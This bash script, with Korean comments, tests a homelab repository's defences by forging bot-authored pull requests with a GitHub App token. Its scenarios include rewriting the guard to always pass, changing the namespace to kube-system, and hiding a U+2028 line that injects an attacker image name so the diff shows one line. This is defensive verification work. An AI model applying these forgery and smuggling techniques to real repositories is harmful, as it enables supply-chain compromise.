#!/usr/bin/env bash
# 태그 PR 검사 거부 검증용: 태그 갱신 GitHub App의 토큰으로 "봇이 연 것처럼 보이는" 위조 PR을 만든다.
# 앱 repo가 털려 App 자격 증명이 새어 나간 상황을 재현한다. 관리 PC(WSL)에서만 실행.
#
#   scripts/forge-bot-pr.sh <App 개인키 .pem> <App client ID> <시나리오...>
#
# 시나리오
#   other-file  태그와 함께 다른 파일(base deployment의 메모리 limit)을 바꾼다
#   same-file   태그와 함께 같은 overlay 파일의 다른 줄(namespace)을 바꾼다
#   guard       검사기 자체(scripts/tag_pr_guard)를 "항상 통과"로 바꾼다
#   workflow    .github/workflows 파일을 바꿔 push한다 (push 자체가 거부돼야 한다)
#   hidden-break 태그 줄 끝에 U+2028 + newName 줄을 숨긴다 (최종 리뷰 C1: diff엔 한 줄, YAML엔 두 줄)
#   rollback    예전에 실제로 빌드·증명된 이미지로 되돌린다 (최종 리뷰 I1: 증명서는 진짜라 통과, 앞섬 검사만 막음)
#   hijack      사람 브랜치(HIJACK_BRANCH, 원격에 있는 작업 브랜치)에 커밋을 push한다 (리뷰 C2: push 거부돼야)
#               예: HIJACK_BRANCH=step5-7-docs scripts/forge-bot-pr.sh ... hijack
#   new-branch  bump/** 밖에 새 브랜치를 만든다 (push 거부돼야)
#   cleanup     위조 PR을 닫고 위조 브랜치를 지운다
#
# 키와 토큰은 화면·로그·명령 인자에 남기지 않는다(헤더는 600 파일로 넘김). 토큰은 끝날 때 폐기한다.
# gh는 쓰지 않는다: WSL의 gh가 Windows gh.exe면 GH_TOKEN이 전달되지 않아 사용자 계정으로 PR이 열린다.
# 위조 PR에는 자동 병합을 예약하지 않는다(검사가 잘못 통과해도 병합되지 않게). 병합 가능 여부는
# PR 화면과 mergeStateStatus로 따로 확인한다.
set -euo pipefail

REPO=June21621/homelab
API=https://api.github.com
# 예전에 실제로 빌드·증명된 portfolio 이미지 (2026-11-05 배포본). 증명서 검사는 통과하는 값이다
FAKE_SHA=a4085114bc9c3a958e200220c68d7741ae056757
FAKE_DIGEST=sha256:2dc2d1e09228b7d14e0eb2e3d22c6e4ac8b27220aa0971584e2e93af0894a591
HIJACK_BRANCH=${HIJACK_BRANCH:-} # 2026-11-16 검증 때는 step5-5-guard (이후 삭제)

die() { echo "오류: $*" >&2; exit 1; }

[[ $# -ge 3 ]] || die "사용법: $0 <키.pem> <client ID> <시나리오...>"
KEY=$1 CLIENT_ID=$2
shift 2
[[ -r "${KEY}" ]] || die "키 파일을 읽을 수 없음: ${KEY}"
for s in "$@"; do
  case "${s}" in
    other-file | same-file | guard | workflow | hidden-break | rollback | hijack | new-branch | cleanup) ;;
    *) die "모르는 시나리오: ${s}" ;;
  esac
  [[ "${s}" != hijack || -n "${HIJACK_BRANCH}" ]] || die "hijack은 HIJACK_BRANCH=<원격 사람 브랜치>가 필요함"
done

work=$(mktemp -d)
umask 077
token_hdr="${work}/token.hdr"
cleanup_all() {
  if [[ -s "${token_hdr}" ]]; then
    curl -fsS -o /dev/null -X DELETE -H @"${token_hdr}" "${API}/installation/token" || true
  fi
  rm -rf "${work}"
}
trap cleanup_all EXIT

b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
pyjson() { python3 -c "import json,sys; d=json.load(sys.stdin); $1"; }

# 1. App JWT(10분 이하) → homelab 설치 → 설치 토큰(1시간, 봇 job과 같은 권한)
now=$(date +%s)
header=$(printf '{"alg":"RS256","typ":"JWT"}' | b64url)
payload=$(printf '{"iat":%d,"exp":%d,"iss":"%s"}' $((now - 60)) $((now + 540)) "${CLIENT_ID}" | b64url)
sig=$(printf '%s.%s' "${header}" "${payload}" | openssl dgst -sha256 -sign "${KEY}" -binary | b64url)
printf 'Authorization: Bearer %s.%s.%s\n' "${header}" "${payload}" "${sig}" >"${work}/jwt.hdr"

app_api() { curl -fsS -H @"${work}/jwt.hdr" -H "Accept: application/vnd.github+json" "$@"; }
slug=$(app_api "${API}/app" | pyjson "print(d['slug'])")
inst=$(app_api "${API}/repos/${REPO}/installation" | pyjson "print(d['id'])")
app_api -X POST "${API}/app/installations/${inst}/access_tokens" \
  -d '{"repositories":["homelab"],"permissions":{"contents":"write","pull_requests":"write"}}' |
  pyjson "print('Authorization: Bearer ' + d['token'])" >"${token_hdr}"
rm -f "${work}/jwt.hdr"
echo "App: ${slug} (설치 토큰 발급됨, 끝나면 폐기)"

api() { curl -fsS -H @"${token_hdr}" -H "Accept: application/vnd.github+json" "$@"; }

# git은 토큰을 URL·인자 대신 credential helper로 헤더 파일에서 읽는다.
# 작은따옴표는 의도: 경로 변수는 helper가 실행될 때 환경 변수에서 펼친다
export FORGE_TOKEN_HDR="${token_hdr}"
# shellcheck disable=SC2016
git_t() {
  git -c credential.helper= \
    -c 'credential.helper=!f() { echo username=x-access-token; echo "password=$(sed "s/^Authorization: Bearer //" "${FORGE_TOKEN_HDR}")"; }; f' "$@"
}

bot_id=$(api "${API}/users/${slug}%5Bbot%5D" | pyjson "print(d['id'])")
git_t clone -q --depth 1 "https://github.com/${REPO}.git" "${work}/homelab"
cd "${work}/homelab"
git config user.name "${slug}[bot]"
git config user.email "${bot_id}+${slug}[bot]@users.noreply.github.com"

prod=gitops/apps/portfolio/overlays/prod/kustomization.yaml
overlays=(gitops/apps/portfolio/overlays/*/kustomization.yaml)
# 진짜 bump처럼 모든 overlay의 newTag·digest 두 줄을 예전 빌드 값으로 바꾼다
set_tag() {
  sed -i -E -e "s/^(    newTag: )\"[0-9a-f]{40}\"$/\\1\"${FAKE_SHA}\"/" \
    -e "s/^(    digest: )sha256:[0-9a-f]{64}$/\\1${FAKE_DIGEST}/" "${overlays[@]}"
}

# 시나리오별 위조 변경. 각 변경이 실제로 들어갔는지 확인한다(안 들어가면 검증이 무의미)
forge() {
  case "$1" in
    other-file)
      set_tag
      sed -i 's/^              memory: 128Mi$/              memory: 2Gi/' gitops/apps/portfolio/base/deployment.yaml
      ;;
    same-file)
      set_tag
      sed -i 's/^namespace: portfolio$/namespace: kube-system/' "${prod}"
      ;;
    guard)
      python3 - <<'EOF'
import pathlib, re
p = pathlib.Path("scripts/tag_pr_guard/src/tag_pr_guard/rules.py")
src, n = re.subn(r"(def evaluate\(.*\n)", r"\1    return []  # forged\n", p.read_text(), count=1)
assert n == 1
p.write_text(src)
EOF
      ;;
    workflow)
      echo "# forged" >>.github/workflows/tag-pr-guard.yaml
      ;;
    hidden-break)
      set_tag
      # git diff에는 newTag 한 줄 교체로 보이지만 kustomize(go-yaml)는 U+2028을 줄바꿈으로 읽는다
      python3 - "${prod}" <<'EOF'
import pathlib, re, sys
p = pathlib.Path(sys.argv[1])
src, n = re.subn(r'(    newTag: "[0-9a-f]{40}")\n', "\\1\u2028    newName: docker.io/attacker/x\n", p.read_text(), count=1)
assert n == 1
p.write_text(src)
EOF
      ;;
    rollback)
      set_tag
      ;;
    hijack | new-branch)
      echo "forged $1" >docs/forged.md
      git add docs/forged.md
      ;;
  esac
  git diff --stat
  [[ -n "$(git status --porcelain)" ]] || die "$1: 위조 변경이 적용되지 않음"
}

# push 자체가 거부돼야 하는 시나리오. 받아들여지면 실패
expect_push_rejected() {
  local s=$1 ref=$2
  if git_t push -q origin "HEAD:refs/heads/${ref}" 2>"${work}/push.err"; then
    echo "실패: ${s} push가 받아들여짐 (${ref})"
    return 1
  fi
  echo "기대대로 push 거부:"
  grep -iE 'workflow|refusing|denied|rule|GH0' "${work}/push.err" || cat "${work}/push.err"
}

run_scenario() {
  local s=$1 branch="bump/portfolio-forge-$1"
  echo
  echo "=== ${s} ==="
  git switch -q main
  git reset -q --hard origin/main
  if [[ "${s}" == hijack ]]; then
    # 사람 브랜치 끝에 커밋을 얹는다 (그 브랜치를 그대로 갱신하는 push)
    git_t fetch -q --depth 1 origin "refs/heads/${HIJACK_BRANCH}:refs/remotes/origin/${HIJACK_BRANCH}"
    git switch -q -C forge-hijack "origin/${HIJACK_BRANCH}"
  else
    git switch -q -C "${branch}"
  fi
  forge "${s}"
  git commit -qam "bump(portfolio): forged ${s}"

  case "${s}" in
    workflow) # App에 Workflows 권한이 없다
      expect_push_rejected "${s}" "${branch}"
      return
      ;;
    hijack) # ruleset bot-only-bump-branches: 사람 브랜치 갱신 금지
      expect_push_rejected "${s}" "${HIJACK_BRANCH}"
      return
      ;;
    new-branch) # 같은 ruleset: bump/** 밖 브랜치 생성 금지
      expect_push_rejected "${s}" "forge-new-branch"
      return
      ;;
  esac

  git_t push -q --force origin "${branch}"
  python3 -c 'import json,sys; print(json.dumps({"title": sys.argv[1], "head": sys.argv[2], "base": "main", "body": sys.argv[3]}))' \
    "bump(portfolio): forged ${s}" "${branch}" "거부 검증용 위조 PR (scripts/forge-bot-pr.sh ${s}). 병합하지 말 것." |
    api -X POST "${API}/repos/${REPO}/pulls" -d @- |
    pyjson "print('PR 생성:', d['html_url'], '작성자:', d['user']['login'])"
}

close_forged() {
  echo
  echo "=== cleanup ==="
  api "${API}/repos/${REPO}/pulls?state=open&per_page=100" |
    pyjson "[print(p['number'], p['head']['ref']) for p in d if p['user']['login'] == '${slug}[bot]' and p['head']['ref'].startswith('bump/portfolio-forge-')]" |
    while read -r number head; do
      api -o /dev/null -X POST "${API}/repos/${REPO}/issues/${number}/comments" -d '{"body":"거부 검증 끝, 위조 PR 닫음"}'
      api -o /dev/null -X PATCH "${API}/repos/${REPO}/pulls/${number}" -d '{"state":"closed"}'
      api -o /dev/null -X DELETE "${API}/repos/${REPO}/git/refs/heads/${head}"
      echo "닫음: #${number} ${head}"
    done
}

for s in "$@"; do
  if [[ "${s}" == cleanup ]]; then close_forged; else run_scenario "${s}"; fi
done
